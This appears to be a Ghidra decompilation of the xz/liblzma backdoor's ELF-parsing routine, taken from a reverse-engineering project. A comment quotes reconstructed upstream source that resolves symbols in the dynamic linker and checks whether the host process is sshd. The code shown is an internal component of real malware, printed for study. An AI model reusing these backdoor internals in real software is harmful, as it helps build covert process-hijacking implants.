// /home/kali/xzre-ghidra/xzregh/1013D0_elf_parse.c
// Function: elf_parse @ 0x1013D0
// Calling convention: __stdcall
// Prototype: BOOL __stdcall elf_parse(Elf64_Ehdr * ehdr, elf_info_t * elf_info)


/*
 * AutoDoc: Generated from upstream sources.
 *
 * Source summary (xzre/xzre.h):
 *   @brief Parses the given in-memory ELF file into elf_info
 *
 *   @param ehdr pointer to the beginning of the ELF header
 *   @param elf_info pointer to the structure that will hold the parsed information
 *   @return BOOL TRUE if parsing completed successfully, FALSE otherwise
 *
 * Upstream implementation excerpt (xzre/xzre_code/elf_parse.c):
 *     BOOL main_elf_parse(main_elf_t *main_elf){
 *     	if(!elf_parse(
 *     		main_elf->dynamic_linker_ehdr,
 *     		main_elf->elf_handles->dynamic_linker
 *     	)){
 *     		return FALSE;
 *     	}
 *     	Elf64_Sym *libc_stack_end_sym;
 *     	if(!(libc_stack_end_sym = elf_symbol_get(
 *     		main_elf->elf_handles->dynamic_linker,
 *     		STR_libc_stack_end,
 *     		STR_GLIBC_2_2_5
 *     	))){
 *     		return FALSE;
 *     	}
 *     	elf_info_t *dynamic_linker = main_elf->elf_handles->dynamic_linker;
 *     	void **libc_stack_end_ptr = (void *)PTRADD(dynamic_linker->elfbase, libc_stack_end_sym->st_value);
 *     	if(!process_is_sshd(dynamic_linker, *libc_stack_end_ptr)){
 *     		return FALSE;
 *     	}
 *     	*main_elf->__libc_stack_end = *libc_stack_end_ptr;
 *     	return TRUE;
 *     }
 */

BOOL elf_parse(Elf64_Ehdr *ehdr,elf_info_t *elf_info)

{
  Elf64_Word p_type;
  uint uVar1;
  uint uVar2;
  uint uVar3;
  _union_4 _Var4;
  Elf64_Rela *pEVar5;
  Elf64_Rela *pEVar6;
  Elf64_Relr *pEVar7;
  Elf64_Ehdr *pEVar8;
  undefined1 auVar9 [16];
  undefined1 auVar10 [16];
  byte bVar11;
  bool bVar12;
  BOOL have_verdef_num_2;
  int i;
  BOOL have_verdef_num_3;
  BOOL have_verdef_num_1;
  BOOL BVar13;
  Elf64_Dyn *dyn;
  _union_4 *p_Var14;
  int dynamic_idx;
  long lVar15;
  Elf64_Xword size;
  u64 *hash_bloom;
  Elf64_Phdr *dyn_phdr;
  ulong uVar16;
  Elf64_Phdr *phdr;
  ulong uVar17;
  uint uVar18;
  Elf64_Xword size_00;
  Elf64_Xword size_01;
  u32 *hash_buckets;
  u32 *hash_chain;
  u64 d_relrsz;
  
  if (ehdr == (Elf64_Ehdr *)0x0) {
    return 0;
  }
  if (elf_info != (elf_info_t *)0x0) {
    uVar16 = 0xffffffffffffffff;
    uVar18 = 0;
    hash_bloom = &elf_info->first_vaddr;
    for (lVar15 = 0x3e; lVar15 != 0; lVar15 = lVar15 + -1) {
      *(undefined4 *)hash_bloom = 0;
      hash_bloom = (u64 *)((long)hash_bloom + 4);
    }
    elf_info->elfbase = ehdr;
    lVar15 = -1;
    uVar17 = (ulong)ehdr->e_phnum;
    dyn_phdr = (Elf64_Phdr *)(ehdr->e_ident + ehdr->e_phoff);
    *(Elf64_Half *)&elf_info->e_phnum = ehdr->e_phnum;
    elf_info->phdrs = dyn_phdr;
    phdr = dyn_phdr;
    for (; uVar18 < (uint)uVar17; uVar18 = uVar18 + 1) {
      p_type = phdr->p_type;
      if (p_type == 1) {
        if (phdr->p_vaddr < uVar16) {
          uVar16 = phdr->p_vaddr;
        }
      }
      else if (p_type == 2) {
        lVar15 = (long)(int)uVar18;
      }
      else {
        have_verdef_num_2 = is_gnu_relro(p_type,0xa0000000);
        if (have_verdef_num_2 != 0) {
          if (elf_info->gnurelro_found != 0) {
            return 0;
          }
          elf_info->gnurelro_vaddr = phdr->p_vaddr;
          d_relrsz = phdr->p_memsz;
          elf_info->gnurelro_found = 1;
          elf_info->gnurelro_memsize = d_relrsz;
        }
      }
      phdr = phdr + 1;
    }
    if ((uVar16 != 0xffffffffffffffff) && ((int)lVar15 != -1)) {
      elf_info->first_vaddr = uVar16;
      uVar17 = dyn_phdr[lVar15].p_memsz;
      dyn = (Elf64_Dyn *)((long)ehdr + (dyn_phdr[lVar15].p_vaddr - uVar16));
      elf_info->dyn = dyn;
      i = (int)(uVar17 >> 4);
      *(int *)&elf_info->dyn_num_entries = i;
      have_verdef_num_3 = elf_contains_vaddr(elf_info,dyn,uVar17,4);
      if (have_verdef_num_3 != 0) {
        p_Var14 = &dyn->d_un;
        bVar12 = false;
        size_00 = 0xffffffffffffffff;
        size_01 = 0xffffffffffffffff;
        size = 0xffffffffffffffff;
        hash_buckets = (uint *)0x0;
        for (dynamic_idx = 0; i != dynamic_idx; dynamic_idx = dynamic_idx + 1) {
          lVar15 = ((Elf64_Dyn *)(p_Var14 + -1))->d_tag;
          if (lVar15 == 0) {
            *(int *)&elf_info->dyn_num_entries = dynamic_idx;
            break;
          }
          if (lVar15 < 0x25) {
            if (lVar15 < 0x17) {
              switch(lVar15) {
              case 2:
                size = p_Var14->d_val;
                break;
              case 5:
                elf_info->strtab = (char *)*(Elf64_Xword *)p_Var14;
                break;
              case 6:
                elf_info->symtab = (Elf64_Sym *)*(Elf64_Xword *)p_Var14;
                break;
              case 7:
                elf_info->rela_relocs = (Elf64_Rela *)*(Elf64_Xword *)p_Var14;
                break;
              case 8:
                size_01 = p_Var14->d_val;
              }
            }
            else {
              switch(lVar15) {
              case 0x17:
                elf_info->plt_relocs = (Elf64_Rela *)*(Elf64_Xword *)p_Var14;
                break;
              case 0x18:
                goto switchD_0010157d_caseD_18;
              case 0x1e:
                bVar11 = *(byte *)p_Var14 & 8;
                goto LAB_00101650;
              case 0x23:
                size_00 = p_Var14->d_val;
                break;
              case 0x24:
                elf_info->relr_relocs = (Elf64_Relr *)*(Elf64_Xword *)p_Var14;
              }
            }
          }
          else if (lVar15 == 0x6ffffffb) {
            bVar11 = *(byte *)p_Var14 & 1;
LAB_00101650:
            if (bVar11 != 0) {
switchD_0010157d_caseD_18:
              elf_info->flags = elf_info->flags | 0x20;
            }
          }
          else if (lVar15 < 0x6ffffffc) {
            if (lVar15 < 0x6ffffefd) {
              if (0x6ffffefa < lVar15) {
                return 0;
              }
              if (lVar15 == 0x6ffffef5) {
                hash_buckets = (u32 *)p_Var14->d_val;
              }
            }
            else if (lVar15 == 0x6ffffff0) {
              _Var4.d_val = *(Elf64_Xword *)p_Var14;
              elf_info->flags = elf_info->flags | 0x10;
              elf_info->versym = (Elf64_Versym *)_Var4;
            }
          }
          else if (lVar15 == 0x6ffffffd) {
            bVar12 = true;
            elf_info->verdef_num = *(Elf64_Xword *)p_Var14;
          }
          else {
            if (lVar15 == 0x7fffffff) {
              return 0;
            }
            if (lVar15 == 0x6ffffffc) {
              elf_info->verdef = (Elf64_Verdef *)*(Elf64_Xword *)p_Var14;
            }
          }
          p_Var14 = p_Var14 + 2;
        }
        pEVar5 = elf_info->plt_relocs;
        if (pEVar5 != (Elf64_Rela *)0x0) {
          if (size == 0xffffffffffffffff) {
            return 0;
          }
          elf_info->flags = elf_info->flags | 1;
          auVar9._8_8_ = 0;
          auVar9._0_8_ = size;
          elf_info->plt_relocs_num = SUB164(auVar9 / ZEXT816(0x18),0);
        }
        pEVar6 = elf_info->rela_relocs;
        if (pEVar6 != (Elf64_Rela *)0x0) {
          if (size_01 == 0xffffffffffffffff) {
            return 0;
          }
          elf_info->flags = elf_info->flags | 2;
          auVar10._8_8_ = 0;
          auVar10._0_8_ = size_01;
          elf_info->rela_relocs_num = SUB164(auVar10 / ZEXT816(0x18),0);
        }
        pEVar7 = elf_info->relr_relocs;
        if (pEVar7 != (Elf64_Relr *)0x0) {
          if (size_00 == 0xffffffffffffffff) {
            return 0;
          }
          elf_info->flags = elf_info->flags | 4;
          elf_info->relr_relocs_num = (u32)(size_00 >> 3);
        }
        if (elf_info->verdef != (Elf64_Verdef *)0x0) {
          if (bVar12) {
            elf_info->flags = elf_info->flags | 8;
          }
          else {
            elf_info->verdef = (Elf64_Verdef *)0x0;
          }
        }
        pEVar8 = (Elf64_Ehdr *)elf_info->strtab;
        if (((pEVar8 != (Elf64_Ehdr *)0x0) && (hash_buckets != (uint *)0x0)) &&
           (elf_info->symtab != (Elf64_Sym *)0x0)) {
          if (pEVar8 <= ehdr) {
            elf_info->strtab = (char *)(ehdr->e_ident + (long)pEVar8->e_ident);
            elf_info->symtab = (Elf64_Sym *)(ehdr->e_ident + (long)&elf_info->symtab->st_name);
            if (pEVar5 != (Elf64_Rela *)0x0) {
              elf_info->plt_relocs = (Elf64_Rela *)(ehdr->e_ident + (long)&pEVar5->r_offset);
            }
            if (pEVar6 != (Elf64_Rela *)0x0) {
              elf_info->rela_relocs = (Elf64_Rela *)(ehdr->e_ident + (long)&pEVar6->r_offset);
            }
            if (pEVar7 != (Elf64_Relr *)0x0) {
              elf_info->relr_relocs = (Elf64_Relr *)((long)pEVar7 + (long)ehdr);
            }
            if (elf_info->versym != (Elf64_Versym *)0x0) {
              elf_info->versym = (Elf64_Versym *)((long)elf_info->versym + (long)ehdr);
            }
            hash_buckets = (u32 *)((long)hash_buckets + (long)ehdr);
          }
          pEVar8 = (Elf64_Ehdr *)elf_info->verdef;
          if ((pEVar8 != (Elf64_Ehdr *)0x0) && (pEVar8 < ehdr)) {
            elf_info->verdef = (Elf64_Verdef *)(pEVar8->e_ident + (long)ehdr->e_ident);
          }
          if (((((elf_info->plt_relocs == (Elf64_Rela *)0x0) ||
                (have_verdef_num_1 = elf_contains_vaddr(elf_info,elf_info->plt_relocs,size,4),
                have_verdef_num_1 != 0)) &&
               ((elf_info->rela_relocs == (Elf64_Rela *)0x0 ||
                (BVar13 = elf_contains_vaddr(elf_info,elf_info->rela_relocs,size_01,4), BVar13 != 0)
                ))) && ((elf_info->relr_relocs == (Elf64_Relr *)0x0 ||
                        (BVar13 = elf_contains_vaddr(elf_info,elf_info->relr_relocs,size_00,4),
                        BVar13 != 0)))) &&
             ((elf_info->verdef == (Elf64_Verdef *)0x0 ||
              (BVar13 = elf_contains_vaddr(elf_info,elf_info->verdef,elf_info->verdef_num * 0x14,4),
              BVar13 != 0)))) {
            uVar18 = *hash_buckets;
            elf_info->gnu_hash_nbuckets = uVar18;
            uVar1 = hash_buckets[2];
            uVar2 = hash_buckets[1];
            elf_info->gnu_hash_last_bloom = uVar1 - 1;
            uVar3 = hash_buckets[3];
            elf_info->gnu_hash_bloom = (u64 *)(hash_buckets + 4);
            hash_chain = (u32 *)((long)(hash_buckets + 4) + (ulong)(uVar1 * 2) * 4);
            elf_info->gnu_hash_bloom_shift = uVar3;
            elf_info->gnu_hash_buckets = hash_chain;
            elf_info->gnu_hash_chain = hash_chain + ((ulong)uVar18 - (ulong)uVar2);
            return 1;
          }
        }
      }
    }
  }
  return 0;
}

